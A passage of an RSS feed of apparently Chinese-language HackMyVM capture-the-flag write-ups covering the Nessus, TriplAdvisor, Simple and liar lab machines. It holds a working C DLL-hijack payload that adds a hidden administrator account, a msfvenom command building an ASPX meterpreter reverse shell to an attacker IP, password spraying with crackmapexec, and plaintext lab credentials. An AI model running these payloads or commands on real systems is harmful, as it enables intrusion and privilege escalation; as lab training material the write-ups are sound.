============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚<br><br>ä¸Šä¼ winpeas.exe æ£€æµ‹ä¸€ä¸‹<br>*Evil-WinRM* PS C:\Users\nesus\Documents&gt; upload ../../../../../home/winpeas/winPEASx64.exe

Info: Uploading /home/kali/hmv/Nessus/../../../../../home/winpeas/winPEASx64.exe to C:\Users\nesus\Documents\winPEASx64.exe


*Evil-WinRM* PS C:\Users\nesus\Documents&gt; cmd /c 'winPEASx64.exe cmd &gt; output.txt'

^
^C
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# evil-winrm -i 192.168.56.156 -u nesus -p 'Z#JuXH$ph-;v@,X&amp;mV)'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents&gt; dir


    Directory: C:\Users\nesus\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/24/2024   9:21 PM          74535 output.txt
-a----        11/24/2024   9:18 PM        9842176 winPEASx64.exe

*Evil-WinRM* PS C:\Users\nesus\Documents&gt; download output.txt

Info: Downloading C:\Users\nesus\Documents\output.txt to output.txt

Info: Download successful!

<br>æ£€æµ‹å‘ç°nessuså­˜åœ¨dllæ³¨å…¥<br>Tenable Nessus(Tenable, Inc. - Tenable Nessus)["C:\Program Files\Tenable\Nessus\nessus-service.exe"] - Autoload
File Permissions: nesus [AllAccess]
Possible DLL Hijacking in binary folder: C:\Program Files\Tenable\Nessus (nesus [AllAccess])
Tenable Nessus Network Security Scanner

   ==&gt;  C:\Program Files\Tenable\Nessus\.winperms (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\fips.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\icudt73.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\icuuc73.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\legacy.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\License.rtf (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nasl.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\ndbg.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\Nessus Web Client.url (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessus-service.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessuscli.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessusd.exe (nesus [AllAccess])

<br><br>è¿™é‡Œæˆ‘åˆ©ç”¨ä½œè€…çš„ä»£ç ç”Ÿæˆä¸€ä¸ªç”¨äºæ–°å»ºç®¡ç†å‘˜çš„dll<br>#include &lt;stdlib.h&gt;  
  
#include &lt;windows.h&gt;  
 // COMPILE  
// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll  
BOOL APIENTRY DllMain(  
  HANDLE hModule, // Handle to DLL module  
  DWORD ul_reason_for_call, // Reason for calling function  
  LPVOID lpReserved) // Reserved  
{  
  switch (ul_reason_for_call) {  
  case DLL_PROCESS_ATTACH: // A process is loading the DLL.  
    int i;  
    i = system("net user admin admin /add");  
    i = system("net localgroup administrators admin /add");  
    i = system("net localgroup 'remote management' admin /add");  
    i = system("net localgroup 'remote desktop' admin /add");  
    break;  
  case DLL_THREAD_ATTACH: // A process is creating a new thread.  
    break;  
  case DLL_THREAD_DETACH: // A thread exits normally.  
    break;  
  case DLL_PROCESS_DETACH: // A process unloads the DLL.  
    break;  
  }  
  return TRUE;  
}
<br>ç¼–è¯‘<br>C:\Users\yu&gt;x86_64-w64-mingw32-gcc C:\Users\yu\Desktop\admin.c --shared -o admin.dll
<br>æ›¿æ¢åå­—<br>C:\Program Files\Tenable\Nessus\fips.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\icudt73.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\icuuc73.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\legacy.dll (nesus [AllAccess])
<br>éšä¾¿æ‰¾ä¸€ä¸ªæ›¿æ¢å³å¯<br>*Evil-WinRM* PS C:\program files\tenable\nessus&gt; mv fips.dll fips_original.dll
*Evil-WinRM* PS C:\program files\tenable\nessus&gt; mv admin.dll fips.dll

<br>é‡å¯é¶æœº<br>
å°è¯•ä½¿ç”¨æ·»åŠ çš„ç”¨æˆ·ç™»å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Nessus]
â””â”€# evil-winrm -i 192.168.56.156 -u admin -p 'admin'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\admin\Documents&gt;
<br>æˆåŠŸç™»å½•ã€‚ç®¡ç†å‘˜ç”¨æˆ·è¿è¡Œcsåé—¨ä¸Šçº¿æ‹¿flagå³å¯]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/27.nessus.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/27.Nessus.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/hmv/assets/kxrxpqqr598.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/kxrxpqqr598.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[26.TriplAdvisor]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=TriplAdvisor
<br>ä½œè€…ï¼š[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>éš¾åº¦ï¼š
<br>çŸ¥è¯†ç‚¹ï¼š
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/TriplAdvisor]
â””â”€# fscan -h 192.168.56.18

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.18:445 open
[\*] alive ports len is: 1
start vulscan
å·²å®Œæˆ 1/1
[\*] æ‰«æç»“æŸ,è€—æ—¶: 3.063691053s
<br>Nmap scan report for 192.168.56.18
Host is up (0.00016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:82:AB:A1 (Oracle VirtualBox virtual NIC)

Host script results:
|\_clock-skew: -49s
| smb2-time:
|   date: 2024-11-21T22:28:31
|\_  start\_date: 2024-11-21T22:24:51
| smb2-security-mode:
|   2:1:0:
|\_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.00 seconds
<br>ä¸å‡ºç½‘æ‰“ä¸äº†å•Šï¼Œè¿åŸŸéƒ½æ²¡å¯åŠ¨<br>5b38df6802c305e752c8f02358721acc
<br>4159a2b3a38697518722695cbb09ee46
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/26.tripladvisor.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/26.TriplAdvisor.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[25.Simple]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. æ‰«ä¸‹ç›®å½•" data-href="#3. æ‰«ä¸‹ç›®å½•" href="https://www.c1trus.top/about:blank#3._æ‰«ä¸‹ç›®å½•" class="internal-link" target="_self" rel="noopener nofollow">3. æ‰«ä¸‹ç›®å½•</a>
<br><a data-tooltip-position="top" aria-label="4. ç”¨æˆ·æ”¶é›†" data-href="#4. ç”¨æˆ·æ”¶é›†" href="https://www.c1trus.top/about:blank#4._ç”¨æˆ·æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">4. ç”¨æˆ·æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="5. SMBå…±äº«" data-href="#5. SMBå…±äº«" href="https://www.c1trus.top/about:blank#5._SMBå…±äº«" class="internal-link" target="_self" rel="noopener nofollow">5. SMBå…±äº«</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Simple
<br>ä½œè€…ï¼š[GatoGamer](https://hackmyvm.eu/profile/?user=GatoGamer)
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼š
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# fscan -h 192.168.56.17

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.17:135 open
192.168.56.17:445 open
192.168.56.17:80 open
192.168.56.17:139 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.17   WORKGROUP\SIMPLE
[\*] NetInfo
[\*]192.168.56.17
   [-&gt;]Simple
   [-&gt;]192.168.56.17
[\*] WebTitle http://192.168.56.17      code:200 len:1481   title:Simple
å·²å®Œæˆ 4/4
[\*] æ‰«æç»“æŸ,è€—æ—¶: 2.735160495s
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# nmap 192.168.56.17 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 14:50 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.10% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.90% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.31% done; ETC: 14:54 (0:03:46 remaining)
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.63% done; ETC: 14:53 (0:03:01 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.89% done; ETC: 14:54 (0:03:28 remaining)
Nmap scan report for 192.168.56.17
Host is up (0.00014s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
<br>åˆæ˜¯ä¸€ä¸ªæ²¡æœ‰åŸŸæ¸—é€çš„é¶æœº<br>çœ‹ä¸‹ç½‘é¡µå§<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" referrerpolicy="no-referrer"><br>æ²¡å•¥ä¸œè¥¿<br><br>æ²¡æœ‰ä¸œè¥¿
<br>åœ¨æºä»£ç é‡Œå‘ç°ä¸€ä¸ªå¥½ç©çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.002.png" referrerpolicy="no-referrer"><br>è¿™é‡Œå†™äº†ä¸€ä¸ªurl<br>æˆ‘ç»™ä»–æ›¿æ¢ä¸€ä¸ªå›¾ç‰‡çœ‹çœ‹<br>æœ¬åœ°kalièµ·ä¸€ä¸ªæœåŠ¡å™¨<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.003.png" referrerpolicy="no-referrer"><br>æˆåŠŸæ›¿æ¢äº†å›¾ç‰‡<br>é‚£æˆ‘æ˜¯ä¸æ˜¯å¯ä»¥ä¸Šä¸€ä¸ªé©¬ï¼Ÿ<br>å¥½å§åˆ©ç”¨ä¸äº†<br><br>é¦–é¡µè¿™é‡Œå¯ä»¥çœ‹åˆ°å¥½å‡ ä¸ªç”¨æˆ·<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.004.png" referrerpolicy="no-referrer"><br>ruy
marcos
lander
bogo
vaiper
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# crackmapexec smb 192.168.56.17 -u user.txt -p user.txt  --no-bruteforce --continue-on-success
SMB         192.168.56.17   445    SIMPLE           [\*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.56.17   445    SIMPLE           [-] Simple\ruy:ruy STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:marcos STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\lander:lander STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\bogo:bogo STATUS\_PASSWORD\_EXPIRED
SMB         192.168.56.17   445    SIMPLE           [-] Simple\vaiper:vaiper STATUS\_LOGON\_FAILURE
<br>æˆ‘ä»¬å‘ç°bogoç”¨æˆ·çš„å¯†ç è¿‡æœŸäº†<br>STATUS_PASSWORD_EXPIREDï¼šè¿™ä¸ªé”™è¯¯ä¿¡æ¯è¡¨ç¤ºç™»å½•å°è¯•å¤±è´¥ï¼Œå› ä¸ºå¯†ç å·²è¿‡æœŸï¼Œæ— æ³•è¿›è¡Œèº«ä»½éªŒè¯ã€‚<br>æˆ‘ä»¬åˆ°virtualboxå»é‡ç½®ä¸€ä¸‹å¯†ç <br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# smbmap -u bogo -H 192.168.56.17 -p bogo

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.17:445       Name: 192.168.56.17             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        LOGS                                                    READ ONLY
        WEB                                                     NO ACCESS
<br>smbclientè¿æ¥çœ‹ä¸‹æœ‰ä»€ä¹ˆä¸œè¥¿<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# smbclient -U 'bogo' //192.168.56.17/IPC$
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
smb: \&gt; exit

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# smbclient -U 'bogo' //192.168.56.17/LOGS
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Oct  9 05:23:36 2023
  ..                                  D        0  Mon Oct  9 05:23:36 2023
  20231008.log                        A     2200  Mon Oct  9 05:23:36 2023

                12966143 blocks of size 4096. 11130886 blocks available
smb: \&gt; get 20231008.log
getting file \20231008.log of size 2200 as 20231008.log (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
smb: \&gt;
<br>é‡Œé¢æœ‰ä¸€ä¸ªæ—¥å¿—<br>PS C:\&gt; dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet\_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm


PS C:\&gt; net use \\127.0.0.1\WEB /user:marcos SuperPassword
<br>å¯ä»¥çœ‹åˆ°marcosç”¨æˆ·çš„å¯†ç SuperPassword
<br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# crackmapexec smb 192.168.56.17 -u marcos -p SuperPassword
SMB         192.168.56.17   445    SIMPLE           [\*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:SuperPassword STATUS\_PASSWORD\_EXPIRED
<br>å‘ç°marcosç”¨æˆ·çš„å¯†ç ä¹Ÿè¿‡æœŸäº†<br>é‡ç½®ä¸€ä¸‹<br>çœ‹ä¸‹marcosç”¨æˆ·çš„SMBå…±äº«<br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/Simple]
â””â”€# smbmap -u marcos -H 192.168.56.17 -p 123456

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.17:445       Name: 192.168.56.17             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        LOGS                                                    READ ONLY
        WEB                                                     READ, WRITE
<br>ç”Ÿæˆä¸€ä¸ªåé—¨ç„¶åè¿ä¸Šå»<br>msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.6 LPORT=1234 -f aspx &gt; reverse.aspx 
<br>
è¢«è¥¿ç­ç‰™è¯­çš„é”®ç›˜å’Œæ“ä½œç³»ç»Ÿæ¶å¿ƒåˆ°äº†ğŸ¤®
<br>SIMPLE{ASPXT0SH311}
<br>SIMPLE{S31MP3R50N4T3PR1V1L363}
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/25.simple.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMBæ¢æµ‹" data-href="#3. SMBæ¢æµ‹" href="https://www.c1trus.top/about:blank#3._SMBæ¢æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3. SMBæ¢æµ‹</a>
<br><a data-tooltip-position="top" aria-label="4. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" data-href="#4. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰æš´åŠ›æšä¸¾å‡ºåŸŸå†…çš„å…¶ä»–ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="5. RunasCS.exe" data-href="#5. RunasCS.exe" href="https://www.c1trus.top/about:blank#5._RunasCS.exe" class="internal-link" target="_self" rel="noopener nofollow">5. RunasCS.exe</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Liar
<br>ä½œè€…ï¼š[sml](https://hackmyvm.eu/profile/?user=sml)
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šridçˆ†ç ´ã€<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/runascsä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a>.exeå·¥å…·<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# fscan -h 192.168.56.16

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.16:445 open
192.168.56.16:139 open
192.168.56.16:80 open
192.168.56.16:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.16   WORKGROUP\WIN-IURF14RBVGV
[\*] NetInfo
[\*]192.168.56.16
   [-&gt;]WIN-IURF14RBVGV
   [-&gt;]192.168.56.16
[\*] WebTitle http://192.168.56.16      code:200 len:63     title:None
å·²å®Œæˆ 4/4
[\*] æ‰«æç»“æŸ,è€—æ—¶: 2.331772501s
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# nmap -sC -sV 192.168.56.16 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 12:55 CST
Nmap scan report for 192.168.56.16
Host is up (0.00019s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|\_http-title: Site doesn't have a title (text/html).
| http-methods:
|\_  Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:2F:A2:49 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|\_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:2f:a2:49 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-11-20T20:35:07
|\_  start\_date: N/A
|\_clock-skew: -8h20m33s
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.10 seconds
<br>è¿™é‡Œåªç»™äº†ä¸€ä¸ªæœºå™¨å<br>å°±ä¸ç”¨é…ç½®hostsäº†<br>éš¾å¾—winé¶æœºå¼€äº†ä¸€ä¸ªç½‘é¡µï¼Œçœ‹ç€ä¸åƒæ˜¯æ‰“åŸŸæ¸—é€çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/24.liar.001.png" referrerpolicy="no-referrer"><br>è¿˜æ˜¯å…ˆçœ‹çœ‹ç½‘é¡µå§ï¼Œè·å–åˆ°ä¸€ä¸ªç”¨æˆ·<br>nica
<br>æ‰«ä¸€æ³¢ç›®å½•è¯•è¯•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/liar]
â””â”€# dirsearch -u http://192.168.56.16
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html
  from pkg\_resources import DistributionNotFound, VersionConflict

  \_|. \_ \_  \_  \_  \_ \_|\_    v0.4.3
 (\_||| \_) (/\_(\_|| (\_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/liar/reports/http\_192.168.56.16/\_24-11-21\_13-01-05.txt

Target: http://192.168.56.16/

[13:01:05] Starting:
[13:01:05] 403 -  312B  - /%2e%2e//google.com
[13:01:05] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[13:01:07] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[13:01:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

